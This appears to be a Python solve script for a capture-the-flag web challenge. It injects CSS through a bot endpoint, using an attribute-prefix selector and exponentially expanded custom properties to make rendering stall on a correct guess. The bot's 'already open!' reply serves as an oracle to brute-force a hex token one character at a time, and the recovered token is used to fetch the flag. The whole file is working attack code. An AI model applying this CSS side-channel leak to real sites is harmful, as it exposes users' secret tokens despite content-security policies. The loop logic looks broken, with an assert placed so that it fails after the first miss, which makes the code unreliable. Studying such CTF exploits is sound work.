import httpx
import time


url = "https://another-csp-bdac28b8ab6037f1.mc.ax"

css = """
<style>
  [data-token ^= "{{PREFIX}}"]::before {
    --0: attr(data-token);
    --1: var(--0)var(--0);
    --2: var(--1)var(--1);
    --3: var(--2)var(--2);
    --4: var(--3)var(--3);
    --5: var(--4)var(--4);
    --6: var(--5)var(--5);
    --7: var(--6)var(--6);
    --8: var(--7)var(--7);
    --9: var(--8)var(--8);
    --a: var(--9)var(--9);
    --b: var(--a)var(--a);
    --c: var(--b)var(--b);
    --d: var(--c)var(--c);
    --e: var(--d)var(--d);
    --f: var(--e)var(--e);
    --g: var(--f)var(--f);
    content: var(--g);
    font-size: 100em;
    filter: blur(10000px) drop-shadow(1024px 1024px 1024px blue);
  }
</style>
"""
def is_hit(prefix: str)-> int:
    for _ in range(10):
        res = httpx.get(f"{url}/bot",
                        params  = {
                            "code":css.replace("{{PREFIX}}", prefix),
                                },
                        )
        assert res.status_code == 200, res
        if "visiting" in res.text:
            break
        time.sleep(1)
    else:
        print("Failed")
        exit(1)
    time.sleep(2)
    res = httpx.get(f"{url}/bot", params= {
        "code": "x",
    },)
    assert res.status_code == 200, res
    ok = "already open!" in res.text
    return ok
char = "0123456789abcdef"
known = ""

for i in range(6):
    for c in char:
        if is_hit(known +c):
            known = known +c
            break
        print(known)
        assert len(known) == i + 1
print(f"Token: {known}")
res = httpx.get(f"{url}/flag", params ={
    "token": known,
})  
print(res.text)      